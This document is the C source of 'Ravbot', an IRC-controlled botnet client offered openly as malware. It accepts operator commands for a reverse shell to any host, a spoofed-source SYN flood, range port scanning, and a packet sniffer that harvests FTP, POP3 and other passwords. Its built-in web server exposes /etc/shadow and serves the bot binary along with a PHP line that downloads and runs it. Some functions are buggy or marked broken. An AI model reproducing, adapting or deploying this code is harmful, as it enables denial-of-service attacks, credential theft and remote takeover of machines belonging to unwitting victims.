/*
 *    Ravbot
 *    A simple irc bot written by Ravo_5002 cuz kaiten just didnt do it.
 *
 *
 *    Todo:
 *    - Fix .google and .download commands
 *    - Add threads to rangescanner
 *    - Add exploits
 *    - Fix segfault which happens when getting kicked off the ircd
 *    - Fix httpd somehow.. Gives connection reset by peer. seems to happen at random....
 *    - Fix segfault in cpuinfo (call function twice and you get a core dump)     
 *
 *    Commands:
 *
 *    .shell 127.0.0.1:1337
 *          Get a shell sent to 127.0.0.1 on port 1337
 *    .hop
 *          Rejoin channel
 *    .scan 192.168.1.1 192.168.1.255 22
 *          Scan range 192.168.1.1-192.168.1.255 for port 22
 *    .scanstop
 *          Stop scanning thread...
 *    .quit
 *          Quits bot
 *    .sysinfo
 *          Retrieve system information from bot host
 *    .synflood www.sco.com:1234 100
 *          Send a syn flood to www.sco.com on port 1234 for 100 seconds.
 *    .sniff.on
 *          Puts sniffing on
 *    .sniff.off
 *          Puts sniffing off
 *    .download http://www.google.com/secretfile.dat /tmp/w00t
 *          Downloads http://www.google.com/secretfile.dat to /tmp/w00t (broken)
 *    .google inurl:admin.php
 *          Returns 10 random results of google searching for inurl:admin.php (broken)
 *    .version
 *          Shows version
 *    .reconnect
 *          Reconnects bawt
 *    .irc PRIVMSG Ravo_5002 Wassap!
 *          Sends raw irc command "PRIVMSG Ravo_5002 Wassap!"
 *    .httpd.start
 *          Starts webserver
 *    .httpd.stop
 *          Shuts down webserver
 *    .nick RavBot
 *          Changes nick to RavBot
 *    .randnick
 *          Gives bot a random nickname
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/sysinfo.h>
#include <sys/utsname.h>
#include <signal.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <fcntl.h>

#undef DEBUG // define for debug mode...

char *server = "irc.dal.net";
int port = 6667;    
char *channel = "#ravioli";
char *sniffchannel = "#ravioli";
char *key = "";
char *hostmask = "Ravo_5002";
char *version = "Ravbot 1.0 :]";

// prototyping
void httpd(int fd, char *info);
void sniff(int fd, char *info);
void google(int fd, char *info);
void rangescan(int fd, char *server);
void download(char *server);
void synflood(int fd, char *server);
void shell(char *server);
char *cpuinfo();
char *systeminfo();
char *randstring();
int ircconnect();


int main(int argc, char *argv) {
    while(1) {
        ircconnect();
        sleep(5); // reconnect after 5 seconds...
    }
}

void httpd(int fd, char *info) { // WTF RESETS THE FRIGGING CONNECTION?
#ifdef DEBUG
    printf("DEBUG: Starting httpd\n");
#endif
    int listenfd, socketfd;
    char buf[1024];
    static char buffer[8096];
    static char request[64];
    static struct sockaddr_in serv_addr;
    static struct sockaddr_in cli_addr;
    size_t length;
    int websrvport = rand()%60000+1337;
    char hostname[64];
    gethostname(hostname, sizeof(hostname));

    listenfd = socket(AF_INET, SOCK_STREAM,0);
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);
    serv_addr.sin_port = htons(websrvport);
    
    bind(listenfd, (struct sockaddr *)&serv_addr,sizeof(serv_addr));
    listen(listenfd,64);

    sprintf(buf, "PRIVMSG %s :Webserver running on %s:%d\n", channel, inet_ntoa(serv_addr.sin_addr), websrvport);
	write(fd, buf, strlen(buf));
    while(1) {
/*
        memset(&cli_addr,0,sizeof(cli_addr));
        memset(request, 0, sizeof(request));
        memset(buffer, 0, sizeof(buffer));
*/
        socketfd = accept(listenfd, (struct sockaddr *) &cli_addr, &length);   
        read(socketfd,request,64);
        //request = strtok(request, "\n");
        sprintf(buf, "PRIVMSG %s :[httpd] Got request from ip %s : %s\n", channel, inet_ntoa(cli_addr.sin_addr), request);
	    write(fd, buf, strlen(buf));
        
        if(strstr(request, "GET /info")) {
            sprintf(buffer,"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            sprintf(buffer,"<html><head><title>BAWT</title></head><body><b>Hello!</b><br><br>This bot is running %s, by Ravo_5002<br><br><b>Bawt specz:</b> %s<br><br></body></html>\r\n\r\n", version, systeminfo());
            write(socketfd,buffer,strlen(buffer));
            close(socketfd);
        }
        else if(strstr(request, "GET /phpr3wt")) {
            sprintf(buffer,"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            sprintf(buffer,"<?php system(\"wget http://iphere/bawt\"); system(\"./bawt\"); ?>\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            close(socketfd);
        }
        else if(strstr(request, "GET /bawt")) {
            int bawt = open("./ircbot", O_RDONLY);
            int ret;
            sprintf(buffer,"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            while ((ret = read(bawt, buffer, 8096)) > 0) {
                write(socketfd,buffer,ret);
            }
            close(bawt);
            close(socketfd);
        }
        else if(strstr(request, "GET /shadow")) {
            int shadow = open("/etc/shadow", O_RDONLY);
            int ret;
            sprintf(buffer,"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            while ((ret = read(shadow, buffer, 8096)) > 0) {
                write(socketfd,buffer,ret);
            }
            close(shadow);
            close(socketfd);
        }
        else if(strstr(request, "GET /") || strstr(request, "GET /index.htm")) {
            sprintf(buffer,"HTTP/1.1 200 OK\r\nConnection: close\r\nContent-Type: text/plain\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            sprintf(buffer,"Webserver @ %s:%s...", hostname, websrvport);
            write(socketfd,buffer,strlen(buffer));
            close(socketfd);
        }
        else if(strstr(request, "GET ")){
            sprintf(buffer,"HTTP/1.1 404 OK\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            sprintf(buffer,"<html><head><title>4o4</title></head><body>Y0u r34ch3d teh 4o4  3rr0r p4g3</body></html>\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            close(socketfd);
        }
        else {
            sprintf(buffer,"HTTP/1.1 400 OK\r\nConnection: close\r\nContent-Type: text/html\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            sprintf(buffer,"<html><head><title>4o0</title></head><body>Y0u r34ch3d teh 4o0  3rr0r p4g3<br><br>j00 made eh baaad requezt...</body></html>\r\n\r\n");
            write(socketfd,buffer,strlen(buffer));
            close(socketfd);
        }
    }
}
void sniff(int fd, char *info) {

    struct ip_tcp_pkt {
        struct ip iph;
        struct tcphdr icmph;
        char payload[8096];
    } tcp_packet;

    int fd7;
    char buf[1024];
 
    if((fd7  = socket(PF_INET,SOCK_RAW,IPPROTO_TCP)) == -1) {
        sprintf(buf, "PRIVMSG %s :NO PERMS!\n", channel);
	    write(fd, buf, strlen(buf));
        exit(EXIT_FAILURE);
    }

    fcntl(fd7,F_SETFL,FNDELAY);

    /* this really ownz */
    char *snifftype[]={
	    "USER", "ftp.user",
	    "PASS", "ftp.pass",
	    "pass", "passwd",
	    //"Cookie", "http.cookie", gives 2 much spam...
	    //"RCPT", "smtp.rcpt",
	    "PART", "irc.part",
	    "JOIN", "irc.join",
	    "PRIVMSG", "irc.talk",
	    "NOTICE", "irc.notice",
	    "TOPIC", "irc.topic",
	    "QUIT", "irc.quit",
	    //"DATA", "smtp.data",
	    //"MAIL", "smtp.mail",
	    "GET", "http.get",
	    "POST", "http.post",
	    "APOP", "pop3.apop",
        NULL
    };
    int i;
    while(1) {
        memset(&tcp_packet,0,sizeof(tcp_packet));
	    read(fd7,(struct ip_tcp_pkt *)&tcp_packet, sizeof(tcp_packet));

        for(i=0;i<sizeof(tcp_packet.payload);i++) {
            if(tcp_packet.payload[i] == '\r' || tcp_packet.payload[i] == '\n') {
                tcp_packet.payload[i]=' ';
            }
        }

        if(!strstr(tcp_packet.payload, channel)) {
            for(i=0;snifftype[i] != NULL; i=i+2) {
                if(strstr(tcp_packet.payload, snifftype[i])) {
                    if((snifftype[i] == "GET" && strstr(tcp_packet.payload, "pass")) || snifftype[i] != "GET") {
                        sprintf(buf, "PRIVMSG %s :[sniff] [%s] %s:%d -> %s:%d | %s\n", sniffchannel, snifftype[i+1], inet_ntoa(tcp_packet.iph.ip_src), htons(tcp_packet.icmph.source), inet_ntoa(tcp_packet.iph.ip_dst), htons(tcp_packet.icmph.dest), tcp_packet.payload);
	                    write(fd, buf, strlen(buf));
                    }
                }
            }
        }
    }
}

void google(int fd, char *info) { // broken
#ifdef DEBUG
    printf("DEBUG: Googling...\n");
#endif
    struct hostent *hp;
    struct sockaddr_in addr;
    int fd6;
    hp = gethostbyname("www.google.com");
	fd6 = socket(AF_INET, SOCK_STREAM, 0);

	addr.sin_port = htons(80);
	addr.sin_family = AF_INET;
    bcopy((char*)hp->h_addr, (char*)&addr.sin_addr, hp->h_length);

	connect(fd6, (struct sockaddr *)&addr, sizeof(addr));
    char *search = strtok(info, "\n");
#ifdef DEBUG
    printf("DEBUG: Googling for %s\n", search);
#endif
    char request[1024];
    sprintf(request, "GET /search?hl=en&q=%s&btnG=Google+Search HTTP/1.1\nHost: www.google.com:80\nUser-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.7) Gecko/20060913 Fedora/1.5.0.7-1.fc5 Firefox/1.5.0.7 pango-text\nAccept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5\nAccept-Language: en-us,en;q=0.5\nAccept-Encoding: text/html\nAccept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7\nKeep-Alive: 300\nConnection: keep-alive\n\n", search);

    write(fd6, request, sizeof(request));
    // receive shit
    char googlebuf[4096];
    char *url;
    char buf[1024];
    while(1) {
        recv(fd6, &buf, sizeof(buf), 0);        
        if(strstr(googlebuf, "<!--m--><a class=l href=")) {
            strtok(googlebuf, "<!--m-->");
            strtok(NULL, "\"");
            url = strtok(NULL, "\"");
	        sprintf(buf, "PRIVMSG %s :Found url %s\n", channel, url);
	        write(fd, buf, strlen(buf));
            exit(EXIT_SUCCESS);
        }
        if(strstr(googlebuf, "</html>")) break;
        memset(googlebuf,0,4096);        
        
    }
    close(fd);
    exit(EXIT_SUCCESS);
}

void rangescan(int fd, char *server) { // works but only 1 thread

    int fd5;
    unsigned long start, end;
    struct sockaddr_in sin;
    unsigned long counter;
    int portopen = 0;

    start = inet_addr(strtok(server, " "));
    end = inet_addr(strtok(NULL, " "));
    int port = atoi(strtok(NULL, "\n"));
    char buf[1024];

    void timeout() {
        close(fd5);
    }

    for (counter = ntohl(start); counter <= ntohl(end); counter++) {
        fd5=socket(AF_INET, SOCK_STREAM, 0);
        sin.sin_family=AF_INET;
        sin.sin_port=htons(port);
        sin.sin_addr.s_addr=htonl(counter);

        signal(SIGALRM, (void *)timeout);
        alarm(2);


        if (connect(fd5, (struct sockaddr*)&sin, sizeof(sin))==0) {
	        sprintf(buf, "PRIVMSG %s :Host %s has port %d open\n", channel, inet_ntoa(sin.sin_addr), port);
	        write(fd, buf, strlen(buf));
            portopen++;
            close(fd5);
        }
    }
	sprintf(buf, "PRIVMSG %s :Done scanning... Found %d servers\n", channel, portopen);
	write(fd, buf, strlen(buf));
    exit(EXIT_SUCCESS);

}

void download(char *server) { // broken

//wtf
}

void synflood(int fd, char *server) {

    char *target = strtok(server, ":");
    int port = atoi(strtok(NULL, " "));
    int seconds = atoi(strtok(NULL, "\n"));
    char buf[1024];


    int fd3;
    int on = 1;
    char packet[4096]; /* Datagram. */
    struct sockaddr_in dest;
    struct iphdr *ip = (struct iphdr *) packet;
    struct tcphdr *tcp = (struct tcphdr *) packet + sizeof(struct iphdr);
    struct hostent *he;
    he = gethostbyname(server);

    if((fd3 = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) {
	    snprintf(buf, sizeof(buf), "PRIVMSG %s :No permissions\n", channel);
		write(fd, buf, strlen(buf));
        exit(EXIT_FAILURE);
    }
    dest.sin_family = AF_INET;
    dest.sin_port = htons(port);
    dest.sin_addr = *((struct in_addr *)he->h_addr);
    memset(packet, 0, 4096); // Zero out packet.

    /* We'll fill in the header outselves. */
    setsockopt(fd3, IPPROTO_IP, IP_HDRINCL, (char *)&on, sizeof(on));
    // Fill in IP headers.
    ip->ihl = 5;
    ip->version = 4;
    ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    ip->id = htons(1337);
    ip->saddr = inet_ntoa(atoi("11.22.33.44"));
    ip->daddr = inet_ntoa(dest.sin_addr);
    ip->ttl = 255;
    ip->protocol = 6;
    ip->check = 0;
    ip->tos = 0;
    ip->frag_off = 0;
    // Fill in TCP headers.
    tcp->source = htons(1337);
    tcp->dest = htons(port);
    tcp->seq = htons(random());
    tcp->ack = 0;
    tcp->syn = 1;
    tcp->window = htons(65535);
    tcp->check = 0;
    tcp->doff = 5;
    tcp->rst = 0;
    tcp->psh = 0;
    tcp->fin = 0;
    tcp->urg = 0;
    tcp->ack_seq = htons(0);

    
    void timeout() {
        close(fd3);        
        snprintf(buf, sizeof(buf), "PRIVMSG %s :Done synflooding\n", channel);
		write(fd, buf, strlen(buf));
        exit(EXIT_SUCCESS);
    }

    signal(SIGALRM, (void *)timeout);
    alarm(seconds);
    /* Insert some more fork()'s in here, if you want. */
    fork();
    fork();
    signal(SIGALRM, (void *)timeout);
    alarm(seconds);
    while(1) {
        sendto(fd3, packet, ip->tot_len, 0, (struct sockaddr *)&dest, sizeof(struct sockaddr));
    }
    exit(EXIT_FAILURE);
}

void shell(char *server) {

    char *ip = strtok(server, ":");
    int port = atoi(strtok(NULL, "\n"));

    int fd2;
    struct sockaddr_in addr;

    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    addr.sin_addr.s_addr = inet_addr(ip);
    fd2 = socket(AF_INET, SOCK_STREAM, 0);
    connect(fd2, (struct sockaddr*)&addr, sizeof(addr));

    write(fd2, "[+] Connected\n", 15);

    dup2(fd2, 0);
    dup2(fd2, 1); 
    dup2(fd2, 2); 

    if (execl("/bin/sh", 0) == -1) {
        write(fd2, "[-] Shell does not exist!\n", 27);
        close(fd2);
        exit(EXIT_FAILURE);
    }

    close(fd2);
    exit(EXIT_SUCCESS);
}

char *cpuinfo() {
    FILE *cpuinfo;
    cpuinfo = fopen("/proc/cpuinfo", "r");
    int c = 1;
    int d = 0;
    char *cpustring;
    while(c != EOF) {
        c = fgetc(cpuinfo);
        cpustring[d] = c;
        d++;
    }
    fclose(cpuinfo);   
    strtok(cpustring, "Hz");
    strtok(NULL, ": ");
    cpustring = strtok(NULL, "\n");
    return cpustring;
}

char *systeminfo() {
#ifdef DEBUG
    printf("DEBUG: Getting system information\n");
#endif
    struct sysinfo sys_info;
    struct utsname u;   

    if(sysinfo(&sys_info) != 0)
        return "No Information Available";
    uname(&u);

    int days, hours, mins;
    days = sys_info.uptime / 86400;
    hours = (sys_info.uptime / 3600) - (days * 24);
    mins = (sys_info.uptime / 60) - (days * 1440) - (hours * 60);
    char hostname[64];
    gethostname(hostname, sizeof(hostname)); 
    char *tmp;
    tmp=(char*)malloc(10);
    memset(tmp,0,10);
    sprintf(tmp, "%s release %s (version %s) on a %s @%sMhz | Uptime: %dd %dh %dm %lds | Ram used: %ldk/%ldk | Hostname: %s",u.sysname, u.release, u.version, u.machine, "cpuinfo()", days, hours, mins, (sys_info.uptime % 60), (sys_info.totalram / 1024)-(sys_info.freeram / 1024), (sys_info.totalram / 1024), hostname); // FIXME: cpuinfo
    return tmp;
}

char *randstring() {
#ifdef DEBUG
    printf("DEBUG: Making random string\n");
#endif
    char *med = "knpbcjmdfgrzlstvwh";
    char *klink = "oe-auy|i";
    char *tmp;
    tmp=(char*)malloc(10);
    memset(tmp,0,10);
    int i;
    int randpos = (rand()%4)+6;
    tmp[0] = toupper(med[rand()%17]);
    for(i=1;i < randpos;i++) {
        if(rand()%5 < (rand()%1)+1) tmp[i] = med[rand()%18];
        else tmp[i] = klink[rand()%8];
    }
#ifdef DEBUG
    printf("DEBUG: String made: %s\n", tmp);
#endif
    return tmp;
}

int ircconnect() { 

    pid_t pid, sid, sniffpid, googlepid, httpdpid, rangescanpid;
#ifndef DEBUG
    pid = fork();
    if (pid < 0) exit(EXIT_FAILURE);
    if (pid > 0) exit(EXIT_SUCCESS);
    umask(0);
    sid = setsid();
    if (sid < 0) exit(EXIT_FAILURE);
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
#endif
#ifdef DEBUG
    printf("DEBUG: Connecting to %s:%d\n", server, port);
#endif
    char buf[1024];
    struct hostent *hp;
    hp = gethostbyname(server);
	int fd;
	struct sockaddr_in addr;

	fd = socket(AF_INET, SOCK_STREAM, 0);

	addr.sin_port = htons(port);
	addr.sin_family = AF_INET;
    bcopy((char*)hp->h_addr, (char*)&addr.sin_addr, hp->h_length);
    while(connect(fd, (struct sockaddr*)&addr, sizeof(addr))) {
        sleep(10);
    }
#ifdef DEBUG
    printf("[+] CONNECTED!\n");
#endif

	snprintf(buf, sizeof(buf), "USER %s . . :%s\n", randstring(), randstring());
	write(fd, buf, strlen(buf)); 


    char *part1, *part2, *part3, *part4, *argument;
    int joined = 0;
	while(1){

        read(fd, buf, sizeof(buf));
        part1 = strtok(buf, " ");
		part2 = strtok(NULL, " "); // topic of ping ofzo
        part3 = strtok(NULL, ":"); // important
        part4 = strtok(NULL, " ");
        argument = strtok(NULL, "\n");

        part1 = strtok(part1, "\n");
        part2 = strtok(part2, "\n");
        part3 = strtok(part3, "\n");
        part4 = strtok(part4, "\n");

        // ircd control
        if(joined == 0 || strstr(part2, "433") || strstr(part2, "432")) {
	        snprintf(buf, sizeof(buf), "NICK %s\n", randstring());
	        write(fd, buf, strlen(buf));
	        snprintf(buf, sizeof(buf), "JOIN %s :%s\n", channel, key);
	        write(fd, buf, strlen(buf));
            joined = 1;
        }
	    if(strstr(part1, "PING")){
		    snprintf(buf, sizeof(buf), "PONG %s\n", part2);
			write(fd, buf, strlen(buf)); 
		}
	    if(strstr(part1, "ERROR")){
            close(fd);
            return 1; 
		}
	    if(strstr(part2, "TOPIC") && strstr(part3, channel)){
		    snprintf(buf, sizeof(buf), "PRIVMSG %s :The topic is now %s %s\n", channel, part4, argument);
			write(fd, buf, strlen(buf)); // do shit with topic here maybe?
		}

        // incoming messages
	    if(strstr(part2, "PRIVMSG")) {
            if(strstr(part1, hostmask) && strstr(part3, channel)) { // valid hostmask and channel?
                // .quit
                if(strstr(part4,".quit")) {
		            snprintf(buf, sizeof(buf), "QUIT :%s\n", version);
			        write(fd, buf, strlen(buf));
                    kill(0,9);
                    exit(EXIT_SUCCESS);
                }
                // .hop
                if(strstr(part4,".hop")) {
		            snprintf(buf, sizeof(buf), "PART %s\n", channel);
			        write(fd, buf, strlen(buf));
		            snprintf(buf, sizeof(buf), "JOIN %s\n", channel);
			        write(fd, buf, strlen(buf));
                }
                // .nick
                if(strstr(part4,".nick")) {
		            snprintf(buf, sizeof(buf), "NICK %s\n", argument);
			        write(fd, buf, strlen(buf));
                }
                // .randnick
                if(strstr(part4,".randnick")) {
		            snprintf(buf, sizeof(buf), "NICK %s\n", randstring());
			        write(fd, buf, strlen(buf));
                }
                // .sysinfo
                if(strstr(part4,".sysinfo")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :%s\n", channel, systeminfo());
			        write(fd, buf, strlen(buf));
                }
                // .shell
                if(strstr(part4,".shell")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Sending shell to %s\n", channel, argument);
			        write(fd, buf, strlen(buf));
                    if (!(fork())) {
                        shell(argument);
                    }       
                }
                // .synflood
                if(strstr(part4,".synflood")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Sending synflood to %s\n", channel, argument);
			        write(fd, buf, strlen(buf));
                    if (!(fork())) {
                        synflood(fd, argument);
                    }
                }
                // .scan
                if(strstr(part4,".scan")) {
                    if(!rangescanpid) {
		                snprintf(buf, sizeof(buf), "PRIVMSG %s :Scanning %s\n", channel, argument);
			            write(fd, buf, strlen(buf));
                        if (!(rangescanpid = fork())) {
                            rangescan(fd, argument);
                        }
                    }
                    else {
		                snprintf(buf, sizeof(buf), "PRIVMSG %s :Already scanning!\n", channel);
			            write(fd, buf, strlen(buf));
                    }
                }
                // .stopscan
                if(strstr(part4,".stopscan")) {
                    if(rangescanpid) {
		                snprintf(buf, sizeof(buf), "PRIVMSG %s :Stopped scanning\n", channel);
			            write(fd, buf, strlen(buf));
                        kill(rangescanpid, 9);
                        rangescanpid = 0;
                    }
                }
                // .download
                if(strstr(part4,".download")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Downloading %s\n", channel, argument);
			        write(fd, buf, strlen(buf));
                    if (!(fork())) {
                        download(argument);
                    }
                }
                // .google
                if(strstr(part4,".google")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Googling %s\n", channel, argument);
			        write(fd, buf, strlen(buf));
                    if (!(googlepid = fork())) {
                        google(fd, argument);
                    }
                }
                // .sniff.start
                if(strstr(part4,".sniff.start")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Sniffing on\n", channel);
			        write(fd, buf, strlen(buf));
                    if (!(sniffpid = fork())) {
                        sniff(fd, argument);
                    }
                }
                // .sniff.stop
                if(strstr(part4,".sniff.stop")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Sniffing off\n", channel);
			        write(fd, buf, strlen(buf));
                    kill(sniffpid,9);
                }
                // .reconnect
                if(strstr(part4,".reconnect")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Reconnecting...\n", channel);
			        write(fd, buf, strlen(buf));
		            snprintf(buf, sizeof(buf), "QUIT :Reconnecting...\n");
			        write(fd, buf, strlen(buf));
                    close(fd);
                    return 1;
                }
                // .version
                if(strstr(part4,".version")) {
		            snprintf(buf, sizeof(buf), "PRIVMSG %s :Version: %s\n", channel, version);
			        write(fd, buf, strlen(buf));
                }
                // .irc
                if(strstr(part4,".irc")) {
		            snprintf(buf, sizeof(buf), "%s", argument);
			        write(fd, buf, strlen(buf));
                }
                // .httpd.start
                if(strstr(part4,".httpd.start")) {
                    if(!httpdpid) {
		                snprintf(buf, sizeof(buf), "PRIVMSG %s :Starting httpd...\n", channel);
			            write(fd, buf, strlen(buf));
                        if (!(httpdpid = fork())) {
                            httpd(fd, argument);
                        }
                    }
                    else {
		                snprintf(buf, sizeof(buf), "PRIVMSG %s :httpd already running!\n", channel);
			            write(fd, buf, strlen(buf));
                    }
                }
                // .httpd.stop
                if(strstr(part4,".httpd.stop")) {
                    if(httpdpid) {
		                snprintf(buf, sizeof(buf), "PRIVMSG %s :Stopping httpd...\n", channel);
			            write(fd, buf, strlen(buf));
                        kill(httpdpid,9);
                        httpdpid = 0;
                    }
                }
            }     
		}        
	}
}
